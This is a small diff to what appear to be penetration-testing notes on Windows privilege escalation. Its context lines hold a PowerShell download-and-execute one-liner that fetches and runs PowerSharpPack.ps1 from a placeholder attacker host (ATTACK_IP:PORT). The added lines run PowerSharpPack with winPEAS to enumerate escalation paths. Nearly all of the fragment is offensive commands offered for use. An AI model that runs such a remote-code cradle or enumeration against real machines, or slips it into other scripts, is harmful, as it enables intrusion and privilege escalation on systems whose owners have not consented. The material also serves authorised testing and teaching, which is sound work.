@@ -13,3 +13,7 @@
 ### 5: PowerSharpUp 
 
     iex(new-object net.webclient).downloadstring('http://ATTACK_IP:PORT/PowerSharpPack.ps1')
+
+### Then
+
+    PowerSharpPack -winPEAS
